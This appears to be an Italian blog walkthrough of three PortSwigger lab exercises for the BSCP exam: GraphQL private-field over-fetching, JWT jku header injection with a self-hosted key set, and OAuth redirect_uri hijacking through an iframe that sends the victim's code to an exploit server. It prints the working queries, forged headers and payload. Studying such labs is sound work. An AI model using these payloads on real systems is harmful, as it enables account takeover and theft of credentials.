---
layout: post
title: "Tre roll, niente a schermo: un campo GraphQL, un header JWT e un redirect che chiama casa"
date: 2026-11-18
categories: [web-security, walkthrough]
tags: [portswigger, bscp, graphql, introspection, jwt, jku, oauth, redirect-uri, exploit-server, burp-suite]
excerpt: "Altri tre roll dello step due, e ognuno ha punito lo stesso istinto: ho scansionato l'input che la pagina mi porgeva, è tornato pulito, e il bug vero stava in un campo GraphQL che la UI non chiede mai, in un header JWT che non vedo, o in un redirect_uri che l'interfaccia compila al posto mio."
lang: it
page_id: three-rolls-nothing-on-screen
permalink: /posts/three-rolls-nothing-on-screen/
---

Ho puntato hashcat sul session token, caricato una wordlist da 113.000 righe e aspettato un segreto che non sarebbe mai arrivato. `Token length exception`, mi ha detto, e io l'ho letto come si legge qualsiasi tool che si lamenta dell'input — flag sbagliata, hash malformato, colpa mia in qualche modo. Ho perso qualche minuto a rigirarmi il token tra le mani prima che l'ovvio mi cadesse addosso: l'header diceva `RS256`. Non c'è nessun segreto. Una chiave privata RSA non la tiri fuori da una wordlist, e quelle quattro parole erano il modo brusco di hashcat per dirmi che avevo portato un password-cracker a un problema di crittografia asimmetrica.

Era il roll di mezzo, dei tre di oggi, e tutti e tre si sono chiusi allo stesso modo: quello che mi serviva non era mai sullo schermo che stavo fissando. Una pagina GraphQL che non mostra mai una password ma, sotto introspection, confessa che il campo esiste. Una search box che scansiona pulita perché il bug è in *come* il server verifica una firma, non in qualcosa che io possa digitare. Un login OAuth dove il parametro sfruttabile è uno che la UI compila per me e che non vedo mai. La [sessione precedente]({% post_url 2026-11-17-cinque-roll-nello-step-due %}) aveva insegnato la stessa cosa partendo da un cookie e da un campo di mass assignment. Questa l'ha solo spostata del tutto fuori dalla pagina.

## Il setup

Stesso [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}), card Escalation spuntata, livello Practitioner, step due della catena BSCP — privilege escalation. Tre roll, tre topic diversi: GraphQL, JWT, OAuth. Due sono usciti come **topic diretti** — le categorie che il Mystery Lab non copre, così il mio tool li apre dal loro vero launch URL e il titolo si brucia da solo appena carica. Preferisco rollare largo su tutto lo step due piuttosto che tenere ogni titolo nascosto, quindi è un prezzo che continuo a pagare.

Strumenti: Burp con Repeater e il tab nativo **GraphQL**, l'estensione **JWT Editor**, l'exploit server e — brevemente, con un filo di imbarazzo — hashcat.

## La sessione

### Roll 1 — Il campo che la pagina account non chiede mai (GraphQL)

Ho fatto login come utente normale e ho guardato il traffico. La pagina My Account non si carica con un `GET` qualunque — spara un `POST` a un endpoint GraphQL con una query `getUser`. Prima mossa su qualsiasi endpoint GraphQL, prima di ogni trovata: **introspection**. Burp te la regala — mandi la richiesta a Repeater, apri il tab **GraphQL**, premi **Set introspection query**, e Burp mi scrive la `__schema` completa invece di farmela comporre a mano.

```graphql
query IntrospectionQuery {
  __schema {
    types { name fields { name } }
  }
}
```

L'ho mandata, ho salvato lo schema e ho letto il type `User`. Eccolo lì — un campo che l'interfaccia non mostra mai:

```
type User {
  id
  username
  password   <-- la pagina account non lo renderizza mai
}
```

Nessun bypass. Nessuna injection. L'exploit è semplicemente *chiedere il campo che non dovrebbe essere raggiungibile*:

```graphql
query {
  getUser(id: 1) {
    id
    username
    password
  }
}
```

`id: 1` è l'administrator. La risposta è tornata con username e password in chiaro — la UI non aveva mai richiesto quel campo, e il resolver non si è mai preoccupato di nasconderlo. Login come administrator, elimino `carlos`, lab risolto. Questo è **over-fetching di un campo privato** — il nome stesso della classe di lab (*Accidental exposure of private GraphQL fields*) è la descrizione della vuln.

Il distinguo che conta per l'esame, perché il prossimo lab GraphQL non sarà così generoso: qui l'introspection era **attiva**. Quando è spenta, non molli — ripieghi sulle **field suggestions**, i suggerimenti `"Did you mean ..."` che i server GraphQL si lasciano sfuggire negli errori quando indovini un nome di campo vicino ma sbagliato. L'introspection ti consegna l'intero schema; le suggestions te lo fanno forzare un campo alla volta. Sappi quale strumento hai in mano:

| Metodo di recon | Quando funziona | Cosa ottieni |
|---|---|---|
| **Introspection** (`__schema`) | il server la lascia abilitata | l'intero schema in una richiesta |
| **Field suggestions** (`Did you mean`) | introspection disabilitata, suggestions attive | un nome di campo per tentativo, dall'errore |
| **Clairvoyance / wordlist** | entrambe chiuse | nomi di campo forzati a dizionario |

**Il rabbit hole**: questo bug è noioso nel senso migliore — un singolo campo over-fetchato — quindi il time-sink è *inventargli una complessità che non ha*. Non mi serviva una mutation, un alias, una batched query, né `__proto__`. Se ti ritrovi a reggere un brute force basato su alias qui, hai già buttato cinque minuti.

### Roll 2 — Il JWT che non sarebbe mai stato craccabile (jku injection)

Questo è partito con un'esca. C'è una search box; l'ho scansionata; è tornata pulita. Non pulita-sicura — pulita *niente-qui*, perché stavo puntando lo scanner sul layer sbagliato. Poi ho fatto login con `wiener:peter`, ho guardato il session cookie e ho visto la superficie vera: è un JWT.

```
GET /my-account?id=wiener
Cookie: session=eyJraWQiOiI2NWFlYzU5ZS1jNzU2L...<token RS256>
```

Decodificato:

```json
// header
{ "kid": "65aec59e-c756-435e-b5ae-6d6ccf91fde2", "alg": "RS256" }
// payload
{ "iss": "portswigger", "exp": 1795032730, "sub": "wiener" }
```

`RS256`, un `kid` che è un UUID, `sub: wiener`. L'obiettivo si scrive da solo — cambiare `sub` in `administrator` — la domanda è *quale* lab JWT sia, perché metà della famiglia condivide esattamente questo token di partenza e da lì l'attacco diverge.

Ed è qui che ho buttato i miei dieci minuti. Ho visto `alg: RS256`, il cervello ha fatto pattern-matching su "weak signing key", e ho scagliato hashcat contro il token:

```bash
hashcat -a 0 -m 16500 <token> jwt.secrets.list
# Token length exception: 1/1 hashes
# No hashes loaded.
```

Ho letto `Token length exception` come un problema di formato e ho smanettato col token per un po' prima che scattasse: **`-m 16500` è per i JWT HMAC** — HS256/384/512, la famiglia simmetrica dove un segreto condiviso firma e verifica. `RS256` è asimmetrico. Non c'è nessun segreto da indovinare; firmare richiede la chiave **privata** RSA del server, e verificare usa quella **pubblica**. hashcat non si stava rompendo. Stava rifiutando un problema che non ha una password dentro. Lezione, scolpita: **leggi `alg` prima di brute-forzare.** `RS` / `ES` / `PS` → asimmetrico → metti via la wordlist.

Quindi quale lab? L'albero decisionale che ora eseguo a vista, invece di tirare a indovinare:

| Cosa provo | Se funziona → lab |
|---|---|
| Manometto `sub`, non rifirmo | firma non verificata |
| `alg: none`, tolgo la firma | verifica della firma difettosa |
| `alg: HS256` + secret debole (hashcat) | weak signing key *(solo HMAC — non questo token)* |
| `/.well-known/jwks.json` è esposto? | algorithm confusion, o una chiave da abusare |
| Inietto un header `jwk` con la mia chiave pubblica | jwk header injection |
| Header `jku` che punta al mio exploit server | **jku header injection** |
| `kid` verso un file (`../../dev/null`) + chiave vuota | kid path traversal |

Uno scan mirato di Burp sul token ha chiuso la questione all'istante — **"JWT arbitrary jku header supported", High, Certain**. Il server si fida dell'header `jku`: va a prendere la chiave di verifica da *qualunque* URL il token nomini. Quindi gli do un URL che possiedo io.

L'exploit, in JWT Editor:

1. **New RSA Key → Generate.** Ora la chiave privata ce l'ho *io*.
2. Pubblico la mia chiave **pubblica** come JWK Set sull'exploit server:

   ```json
   { "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "<mio-kid>", "n": "<mio-modulo>" } ] }
   ```
3. Forgio il token — `sub: administrator` — e imposto l'header per puntare `jku` a quel file, con il `kid` che combacia con la mia chiave:

   ```json
   { "kid": "<mio-kid>", "alg": "RS256", "jku": "https://<exploit-server>/exploit" }
   ```
4. **Sign** con la mia chiave privata, *Don't modify header* spuntato così non mi rimuove il `jku`.
5. Lo mando a `/admin`, elimino `carlos`.

Il server legge il mio `jku`, scarica la *mia* chiave pubblica, verifica la firma — che è valida, perché l'ho firmata con la privata corrispondente — e conclude che il token è autentico. La crittografia è impeccabile; ha solo verificato contro una chiave che gli ho passato io. Stessa forma del roll OAuth qui sotto, e stessa forma di ogni bug "fidati del puntatore del token stesso": **`jwk` porta la chiave, `jku` linka la chiave, `kid` seleziona la chiave — un bug in tre travestimenti.**

### Roll 3 — Il 302 che Repeater non voleva seguire (OAuth redirect_uri)

Login con i social. Il flusso passa il browser a un OAuth provider che — dopo l'autenticazione — rimanda all'app con un authorization `code`. L'indirizzo a cui il provider spedisce quel code è `redirect_uri`. In un setup sano il provider lo blocca su una allow-list. Qui non validava niente: potevo metterci qualsiasi cosa.

```
GET /auth?client_id=...&redirect_uri=https://<exploit-server>&response_type=code&scope=openid%20profile%20email
```

> Se decido io **dove** il provider consegna il code della vittima, lo faccio consegnare a me.

L'ho confermato in Repeater e ho sbattuto sul primo dead end — autoinflitto:

```
HTTP/2 302 Found
Location: https://<exploit-server>/?code=4lHu7Pdri56mX6z1SE5XP9hcFG1X4FI-TkSvqVUij61
```

Il 302 era perfetto, il code era lì nel `Location`... e l'access log dell'exploit server era **vuoto**. L'ho fissato più a lungo di quanto mi piaccia ammettere prima di ricordare: **Repeater non segue i redirect.** Un 302 è un'*istruzione* al browser — "ora vai qui". Repeater legge l'istruzione e si ferma. Niente arriva mai all'exploit server, quindi niente viene loggato. Serve qualcosa che *obbedisca* al redirect: un browser vero.

È esattamente per questo che l'attacco si costruisce su un `<iframe>` consegnato alla vittima:

```html
<iframe src="https://<oauth-server>/auth?client_id=...&redirect_uri=https://<exploit-server>&response_type=code&scope=openid%20profile%20email"></iframe>
```

La vittima (admin) è **già autenticata al provider**, quindi caricare l'iframe scatena un redirect silenzioso — nessuna richiesta di login — e il browser *segue* il 302, lasciando cadere il `code` di admin nel mio access log. Prendo il code e lo spendo sul callback vero:

```
GET /oauth-callback?code=<code-rubato>
```

L'app scambia il code con l'identità di admin e mi logga come admin. Elimino `carlos`. Fatto.

Due cose che a questo lab fanno perdere la gente: il `code` è **monouso** — brucia quello di prova, ri-consegna — e devi pescare la richiesta **della vittima** dal log, non la tua sonda. E il distinguo da esame: questo è l'unico roll **interattivo** dei tre. Ha bisogno che la vittima simulata esista e sia loggata. Non lo risolvi al tuo ritmo.

## Il pattern

Tre roll, tre topic, una spina dorsale sola: **l'input che la pagina mi porgeva era un'esca, e il bug viveva in qualcosa che l'interfaccia non mostra.**

- GraphQL — la UI renderizza `username`, mai `password`. L'introspection confessa che il campo c'è e il resolver lo serve comunque.
- JWT — la search box scansiona pulita; la vuln è in *come il server va a prendere la chiave di verifica*, guidata da un header (`jku`) che di norma non vedo.
- OAuth — il parametro sfruttabile (`redirect_uri`) è uno che il client compila per me; lo raggiungo solo intercettando la richiesta.

E due dei tre condividono un pattern più stretto che vale la pena nominare da solo: **il server si fida di un puntatore controllato dall'attaccante verso il proprio trust anchor.** `jku` del JWT punta alla chiave che valida il token; `redirect_uri` dell'OAuth punta alla destinazione che riceve il code. In entrambi il meccanismo è corretto e la fix è identica — *non lasciare mai che sia la richiesta a scegliere da dove arriva la fiducia; bloccala su una allow-list.*

## Esame e campo

Tutti e tre stanno nello **Stage 2 — privilege escalation**. Come li riconoscerei in fretta, sotto il cronometro:

- **GraphQL**: il tell è l'endpoint stesso. Vedi `/graphql` (o un `POST` con body `query`) e la prima mossa è introspection dal tab GraphQL di Burp — *prima* di pensare alla vuln. Leggi i field dei type e caccia qualsiasi cosa la UI non richieda mai. Non-interattivo.
- **JWT**: decodifica il token a vista. Leggi `alg` per primo — ammazza il percorso sbagliato (niente hashcat su `RS256`). Poi controlla `/.well-known/jwks.json` e lancia uno scan mirato sul token; `kid`/`jku`/`jwk` nell'header puntano ognuno a un lab diverso. Non-interattivo.
- **OAuth**: intercetta la richiesta `/auth` e prova a cambiare `redirect_uri` con un host arbitrario. Un 302 che porta allegramente il `code` al tuo host è tutto il finding. Interattivo — metti in conto la vittima.

I rabbit hole, ognuno un minuto vero che ho perso o quasi perso:

- hashcat su un token `RS256` — non c'è nessun segreto simmetrico; l'errore ti sta dicendo che l'attacco è sbagliato, non l'input.
- Reggere mutation / alias / batching GraphQL quando il bug è un singolo campo over-fetchato.
- Fidarsi del log vuoto di Repeater su un redirect OAuth — Repeater non segue i 302; solo un browser lo fa.

Interattivo o no conta qui: GraphQL e JWT li risolvi da solo, a piena velocità. L'OAuth `redirect_uri` ti fa aspettare una vittima — quando il nemico è il cronometro, preferisci le vincite non-interattive.

## Cosa viene dopo

Lo step due ha ancora buchi che non ho pubblicato: **access control** (IDOR, parametri nascosti, orizzontale vs verticale), **CORS** (ACAO riflesso con credentials, origin `null`), e logica di **password reset** (token prevedibili, host-header poisoning). La sola famiglia JWT ha altri travestimenti da provare — `algorithm confusion` e `kid path traversal` sono i due candidati vivi su un token come questo, e oggi ho chiuso solo `jku`. Quelli sono i prossimi roll.

## Takeaway

- Un `Token length exception` da `hashcat -m 16500` su un token `RS256` non è un bug di formato — è "qui non esiste nessun segreto simmetrico". Leggi `alg` prima di caricare una wordlist.
- L'introspection GraphQL *è* lo step di recon: lo schema elenca campi che la UI non richiederà mai. Chiedili. Quando l'introspection è spenta, ripiega sulle field suggestions `"Did you mean"`.
- `jwk` / `jku` / `kid` sono un bug in tre travestimenti — il server lascia che sia il token a dettare quale chiave lo verifica. La fix per tutti e tre è una allow-list, non una validazione più furba.
- Repeater non segue i redirect. Un `code` OAuth arriva al log del tuo exploit server solo quando un browser vero obbedisce al 302 — ecco perché l'attacco cavalca un iframe consegnato a una vittima loggata.
- Preferisci le vincite non-interattive (GraphQL, JWT) a quelle interattive (OAuth `redirect_uri`) sotto il tempo d'esame — non aspetti mai una vittima.

## Riferimenti utili

- PortSwigger Lab — [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- PortSwigger Lab — [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
- PortSwigger Lab — [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [botesjuan — BSCP Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- Burp extension — **JWT Editor** (BApp Store) · il tab **GraphQL** integrato in Burp per l'introspection

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (PortSwigger's Web Security Academy). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
